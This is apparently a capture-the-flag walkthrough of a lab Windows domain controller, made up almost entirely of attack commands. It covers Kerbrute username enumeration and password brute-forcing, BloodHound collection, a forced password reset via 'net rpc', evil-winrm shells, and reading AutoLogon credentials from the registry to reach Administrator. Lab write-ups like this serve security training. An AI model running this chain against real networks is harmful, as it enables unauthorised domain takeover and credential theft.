There all the standard Windows ports open

We use Kerbrute to determine usernames on the server

./kerbrute_linux_amd64 userenum -d megachange.nyx /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.10.8

We find a username, alfredo. Let's brute force their password.

./kerbrute_linux_amd64 bruteuser --dc 192.168.10.8 -d megachange.nyx /usr/share/wordlists/rockyou.txt alfredo

nxc smb 192.168.10.8 -u alfredo -p 'Password1'

We now have a working credential pair

Let's use Bloodhound to figure out what permissions we have over domain accounts

sudo neo4j console

bloodhound

And then get Bloodhound collection with Netexec

nxc ldap 192.168.10.8 -u alfredo -p 'Password1' --bloodhound --collection All

From the Bloodhound output, we see that the alfredo users can change the password of the sysadmin user. We use Bloodhound's advice to take advantage:

net rpc password "sysadmin" 'hackerfrogs1!' -U "megachange.nyx"/"alfredo"%"Password1" -S "192.168.10.8"

From here, we see that the sysadmin user has winrm access

nxc winrm 192.168.10.8 --dns-server 192.168.10.8 -u sysadmin -p 'hackerfrogs1!'

evil-winrm -i 192.168.10.8 -u 'sysadmin' -p 'hackerfrogs1!'

From here, we can do a standard check for AutoLogon credentials, and we find some

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

From here, we confirm whether the creds we found are legit or not

nxc winrm 192.168.10.8 --dns-server 192.168.10.8 -u Administrator -p 'd0m@in_c0ntr0ll3r'

evil-winrm -i 192.168.10.8 -u 'Administrator' -p 'd0m@in_c0ntr0ll3r'

Finis
